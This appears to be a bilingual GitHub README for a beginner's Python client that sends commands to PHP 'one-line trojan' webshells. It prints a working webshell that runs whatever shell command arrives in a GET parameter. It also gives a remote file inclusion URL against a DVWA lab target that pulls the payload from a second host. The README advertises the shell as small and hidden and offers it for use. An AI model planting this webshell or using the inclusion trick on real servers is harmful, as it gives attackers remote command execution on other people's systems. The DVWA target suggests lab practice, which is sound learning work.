# WebShell v1.0

> If you like it, please give me a Star
> 
> 如果你喜欢它 , 请给我一个Star
> 
> **不喜自喷**

适用于**一句话木马**等一系列webshell

- 支持GET请求的一句话木马
- 小巧隐蔽
- (编不下去了

木马格式 : 

1 . PHP

```php
<? @echo(shell_exec($_GET['CMD']))
```

2 . 文件包含

```
http://192.168.1.150/DVWA/vulnerabilities/fi/?page=http://192.168.1.127:8000/http://192.168.1.150/DVWA/vulnerabilities/fi/?page=http://192.168.1.127:8000/include.php
# include.php同上
```

使用方法:

在终端使用python命令运行

**需要安装requests类库**

![1.png](https://i.loli.net/2021/01/31/38qQGkAKhzTugOC.png)
![2.png](https://i.loli.net/2021/01/31/51yG2aDutoVlnCO.png)

<u>缺点 : 没有办法输入交互</u>

In the end,enjoy it!

(2021 1 31 我的第一个github项目

## English Document

> <u>**Machine translation follows**</u>

Applicable to a series of webshells such as **a Trojan sentence**

- A one-sentence Trojan that supports GET requests
- Small hidden
  
  <br/>

Trojan Format :

1 . PHP

```php
<? @echo(shell_exec($_GET['CMD']))
```

2 . File Inclusion

```
http://192.168.1.150/DVWA/vulnerabilities/fi/?page=http://192.168.1.127:8000/http://192.168.1.150/DVWA/vulnerabilities/fi/?page=http://192.168.1.127:8000/include.php
# 'include.php' Same as above
```

Usage:

Run it from the terminal using 'python' commands

** Requires installing the 'Requests' class library **

<br/>

![1.png](https://i.loli.net/2021/01/31/38qQGkAKhzTugOC.png)
![2.png](https://i.loli.net/2021/01/31/51yG2aDutoVlnCO.png)

<u>Cons: No way to enter interaction</u>

In the end,enjoy it!

*(2021 1 31 My first GitHub project*
